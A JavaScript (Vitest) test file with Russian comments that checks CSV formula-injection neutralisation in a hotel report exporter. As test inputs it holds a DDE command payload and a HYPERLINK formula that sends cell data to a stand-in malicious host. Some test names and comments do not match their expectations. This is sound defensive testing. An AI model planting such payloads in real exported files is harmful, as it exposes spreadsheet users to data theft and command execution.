import { describe, it, expect } from 'vitest'
import { loadCjs } from './helpers/loadCjs.js'

/**
 * Нейтрализация формул в CSV — добор границ (D4-002, второй заход).
 *
 * Основные случаи уже покрыты в `exportSafety.test.js`. Здесь — то, что
 * проверка «смотрим только на str[0]» не ловит:
 *
 *  • пробел (обычный и неразрывный) перед знаком формулы;
 *  • перевод строки перед знаком формулы;
 *  • пустой первый символ у значения, пришедшего не строкой.
 *
 * Рекомендация OWASP (CSV Injection) — нормализовать ведущие пробельные символы
 * ДО проверки первого знака, потому что импорт в табличный редактор их обрезает.
 * Что делает наш код — зафиксировано ниже; расхождение с рекомендацией помечено
 * `it.fails`, чтобы прогон оставался зелёным, а находка не потерялась.
 */

const exp = () => loadCjs('src/reports/export.js')

const result = (rows, columns = [{ key: 'guest', title: 'Гость', type: 'text' }]) => ({
  report: { title: 'Проверка' },
  params: {},
  meta: { hotelName: 'Отель', generatedAt: '2026-09-09T05:00:00.000Z' },
  columns,
  rows,
  totals: {},
})

const csvLines = (rows, columns) =>
  exp().buildCsv(result(rows, columns), 'Итого')
    .toString('utf8')
    .replace(/^﻿/, '')   // BOM — забота Excel о кодировке, а не часть ячейки
    .split('\r\n')

describe('csvSafe — знак формулы вплотную к началу', () => {
  it('одиночная кавычка ставится перед =, @, табуляцией и возвратом каретки', () => {
    const { csvSafe } = exp()
    expect(csvSafe('=1+1')).toBe("'=1+1")
    expect(csvSafe('@SUM(A1)')).toBe("'@SUM(A1)")
    expect(csvSafe('\t=1+1')).toBe("'\t=1+1")
    expect(csvSafe('\r=1+1')).toBe("'\r=1+1")
  })

  it('DDE-вызов через плюс обезврежен: этим и уводят данные из чужого файла', () => {
    const { csvSafe } = exp()
    expect(csvSafe('+cmd|\' /C calc\'!A0')).toBe("'+cmd|' /C calc'!A0")
  })

  it('ссылка HYPERLINK в имени гостя не остаётся формулой', () => {
    const [, row] = csvLines([{ guest: '=HYPERLINK("http://зло/"&B2;"Иванов")' }])
    // Точка с запятой внутри уводит ячейку в кавычки — апостроф обязан стоять
    // первым знаком уже ВНУТРИ них.
    expect(row.startsWith('"\'=HYPERLINK')).toBe(true)
  })
})

describe('csvSafe — пробел перед знаком формулы (находка)', () => {
  it('обычный пробел перед «=» должен обезвреживаться: импорт CSV ведущие пробелы обрезает', () => {
    const { csvSafe } = exp()
    expect(csvSafe(' =1+1')).toBe("' =1+1")
  })

  it('неразрывный пробел перед «=» — тот же обход другим символом', () => {
    const { csvSafe } = exp()
    expect(csvSafe(' =1+1')).toBe("' =1+1")
  })

  it('перевод строки перед «=» тоже не проверяется, хотя \\r проверяется', () => {
    const { csvSafe } = exp()
    // `\r` в списке опасных знаков есть, `\n` — нет; для многострочной ячейки
    // это одна и та же ситуация.
    expect(csvSafe('\n=1+1')).toBe("'\n=1+1")
  })

  it('имя гостя с пробелом перед формулой уходит в файл формулой', () => {
    const [, row] = csvLines([{ guest: ' =HYPERLINK("http://зло/"&B2;"Иванов")' }])
    // Ячейка уедет в кавычки из-за точки с запятой; апострофа внутри нет.
    expect(row).toContain("'")
  })
})

describe('buildCsv — обезвреживание не портит нормальные данные', () => {
  it('телефон со знаком плюс остаётся телефоном, а не текстом с апострофом', () => {
    const [, row] = csvLines([{ guest: '+7 (701) 123-45-67' }])
    expect(row).toBe('+7 (701) 123-45-67')
  })

  it('отрицательная сумма в числовой колонке остаётся числом с запятой', () => {
    const [, row] = csvLines(
      [{ due: -1200.5 }],
      [{ key: 'due', title: 'Долг', type: 'money' }],
    )
    expect(row).toBe('-1200,5')
  })

  it('заголовок колонки обезвреживается наравне со значениями', () => {
    const [head] = csvLines([], [{ key: 'x', title: '=1+1', type: 'text' }])
    expect(head).toBe("'=1+1")
  })

  it('апостроф ставится ДО кавычек, а не внутрь уже закавыченной ячейки', () => {
    const [, row] = csvLines([{ guest: '=A1;B1' }])
    // Точка с запятой уводит ячейку в кавычки, апостроф обязан быть первым внутри
    expect(row).toBe('"\'=A1;B1"')
  })

  it('пустое значение остаётся пустым, а не превращается в апостроф', () => {
    const [, row] = csvLines([{ guest: '' }])
    expect(row).toBe('')
  })
})
